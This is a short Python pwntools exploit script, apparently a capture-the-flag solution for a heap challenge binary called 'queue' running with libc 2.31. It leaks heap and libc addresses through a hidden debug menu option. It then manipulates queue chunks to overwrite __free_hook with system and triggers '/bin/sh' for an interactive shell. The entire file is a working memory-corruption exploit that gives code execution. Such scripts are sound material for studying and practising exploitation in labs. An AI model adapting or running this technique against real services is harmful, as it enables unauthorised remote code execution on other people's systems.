#!/usr/bin/env python3

from pwn import *

exe = ELF("../bin/queue")
libc = ELF("./libc-2.31.so")
ld = ELF("./ld-2.31.so")

context.binary = exe

host = args.HOST or 'localhost'
port = args.PORT or 31283

def local():
  return process([ld.path, exe.path], env={"LD_PRELOAD": libc.path})

def conn():
  if args.LOCAL:
    return local()
  else:
    return remote(host, port)

def debug():
  if args.LOCAL:
    gdb.attach(r, gdbscript=gdbscript)
    pause()

gdbscript = f'''
'''

r = conn()

# good luck pwning :)

def create(idx):
  r.sendline(b'1')
  r.sendline(str(idx).encode())

def free(idx):
  r.sendline(b'2')
  r.sendline(str(idx).encode())

def push(idx, item):
  r.sendline(b'3')
  r.sendline(str(idx).encode())
  r.send(item)

def pop(idx):
  r.sendline(b'4')
  r.sendline(str(idx).encode())

def compact(idx):
  r.sendline(b'5')
  r.sendline(str(idx).encode())

def dbg(idx):
  r.sendline(b'69')
  r.sendline(str(idx).encode())

create(0)
dbg(0)
r.recvuntil(b'data: ')
heap = int(r.recvline(), 16) - 0x2d0
log.info(hex(heap))
r.recvuntil(b'cmp: ')
libc.address = int(r.recvline(), 16) - libc.sym['__strcmp_avx2']
log.info(hex(libc.address))

create(1)
compact(0)
push(0, b'~'*31)
push(1, b'd'*31)
push(1, b'c'*31)
push(1, b'b'*31)
push(1, b'a'*31)
pop(1)
pop(1)
pop(1)
pop(1)
push(0, b'}\n')
push(0, b'|\n')
push(0, b'{\n')
push(0, p64(libc.sym['__free_hook'] - 31 + 6) + b'\n')
push(1, b'a'*31)
push(1, b'/bin/sh;' + b'a'*(31-8))
push(1, b'a' * (31 - 6) + p64(libc.sym['system'])[:6])
pop(1)
r.clean()

r.interactive()
